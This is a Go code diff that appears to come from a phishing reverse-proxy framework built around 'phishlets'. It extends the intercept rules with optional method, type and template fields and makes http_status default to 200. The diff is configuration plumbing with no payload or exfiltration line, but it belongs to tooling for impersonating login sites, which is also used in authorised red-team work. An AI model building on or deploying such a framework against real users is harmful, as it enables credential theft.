@@ -100,6 +100,9 @@ type JsInject struct {
 type Intercept struct {
 	domain      string         `mapstructure:"domain"`
 	path        *regexp.Regexp `mapstructure:"path"`
+	method      string         `mapstructure:"method"`
+	type_       string         `mapstructure:"type"`
+	template    string         `mapstructure:"template"`
 	http_status int            `mapstructure:"http_status"`
 	body        string         `mapstructure:"body"`
 	mime        string         `mapstructure:"mime"`
@@ -220,6 +223,9 @@ type ConfigJsInject struct {
 type ConfigIntercept struct {
 	Domain     *string `mapstructure:"domain"`
 	Path       *string `mapstructure:"path"`
+	Method     *string `mapstructure:"method"`
+	Type       *string `mapstructure:"type"`
+	Template   *string `mapstructure:"template"`
 	HttpStatus *int    `mapstructure:"http_status"`
 	Body       *string `mapstructure:"body"`
 	Mime       *string `mapstructure:"mime"`
@@ -501,7 +507,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 	if fp.Intercept != nil {
 		for _, ic := range *fp.Intercept {
 			var err error
-			var body, mime string
+			var body, mime, method, type_, template string
 			if ic.Domain == nil {
 				return fmt.Errorf("intercept: missing `domain` field")
 			}
@@ -515,8 +521,21 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			if err != nil {
 				return fmt.Errorf("intercept: `path` invalid regular expression: %v", err)
 			}
-			if ic.HttpStatus == nil {
-				return fmt.Errorf("intercept: missing `http_status` field")
+			if ic.Method != nil {
+				method = *ic.Method
+			}
+			if ic.Type != nil {
+				type_ = *ic.Type
+			}
+			if type_ == "" {
+				type_ = "static"
+			}
+			if ic.Template != nil {
+				template = *ic.Template
+			}
+			http_status := 200
+			if ic.HttpStatus != nil {
+				http_status = *ic.HttpStatus
 			}
 			if ic.Body != nil {
 				body = *ic.Body
@@ -524,7 +543,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			if ic.Mime != nil {
 				mime = *ic.Mime
 			}
-			err = p.addIntercept(*ic.Domain, path_re, *ic.HttpStatus, body, mime)
+			err = p.addIntercept(*ic.Domain, path_re, method, type_, template, http_status, body, mime)
 			if err != nil {
 				return err
 			}
@@ -1064,10 +1083,13 @@ func (p *Phishlet) addJsInject(trigger_domains []string, trigger_paths []string,
 	return nil
 }
 
-func (p *Phishlet) addIntercept(domain string, path *regexp.Regexp, http_status int, body string, mime string) error {
+func (p *Phishlet) addIntercept(domain string, path *regexp.Regexp, method string, type_ string, template string, http_status int, body string, mime string) error {
 	ic := Intercept{
 		domain:      strings.ToLower(domain),
 		path:        path,
+		method:      method,
+		type_:       type_,
+		template:    template,
 		http_status: http_status,
 		body:        body,
 		mime:        mime,
